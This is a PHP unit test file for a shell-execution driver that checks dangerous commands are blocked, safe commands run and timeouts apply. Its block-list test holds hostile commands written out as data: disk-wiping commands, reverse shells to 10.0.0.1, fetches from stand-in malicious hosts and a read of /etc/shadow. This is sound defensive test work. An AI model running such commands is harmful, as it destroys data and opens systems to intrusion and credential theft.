<?php

declare(strict_types=1);

namespace Tests\Unit\Execution\Drivers;

use App\Execution\Drivers\ShellDriver;
use App\Models\Task;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class ShellDriverTest extends TestCase
{
    use RefreshDatabase;

    private ShellDriver $driver;

    protected function setUp(): void
    {
        parent::setUp();
        // Short timeout for fast tests
        $this->driver = new ShellDriver([
            'timeout' => 1,
            'max_retries' => 1,
            'safety_limits' => [
                'memory_mb' => 256,
                'cpu_percent' => 25,
            ],
        ]);
    }

    public function test_blocks_dangerous_commands(): void
    {
        $blocked = [
            'rm -rf /',
            'mkfs.ext4 /dev/sda1',
            'dd if=/dev/zero of=/dev/sda',
            'curl https://evil.com',
            'wget http://malware.com',
            'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',
            'nc -e /bin/sh 10.0.0.1 1234',
            'python -c "import socket; s=socket.socket()"',
            'ssh root@server',
            'sudo cat /etc/shadow',
            'chmod 777 /etc',
        ];

        foreach ($blocked as $command) {
            $task = Task::factory()->create([
                'driver' => 'shell',
                'payload' => ['command' => $command],
            ]);

            $result = $this->driver->execute($task);

            $this->assertFalse($result->success, "Command should be blocked: {$command}");
            $this->assertStringContainsString('blocked', strtolower($result->error));
        }
    }

    public function test_allows_safe_commands(): void
    {
        $task = Task::factory()->create([
            'driver' => 'shell',
            'payload' => ['command' => 'echo "hello world"'],
        ]);

        $result = $this->driver->execute($task);

        $this->assertTrue($result->success);
        $this->assertStringContainsString('hello world', $result->output);
    }

        public function test_enforces_timeout(): void
    {
        // Use Windows-compatible command that takes longer than 1 second
        $command = PHP_OS_FAMILY === 'Windows' 
            ? 'powershell -Command "Start-Sleep -Seconds 5"'  // Windows
            : 'sleep 5';  // Linux/Mac

        $task = Task::factory()->create([
            'driver' => 'shell',
            'payload' => ['command' => $command],
        ]);

        $result = $this->driver->execute($task);

        $this->assertFalse($result->success);
        $this->assertStringContainsString('timeout', strtolower($result->error));
    }
}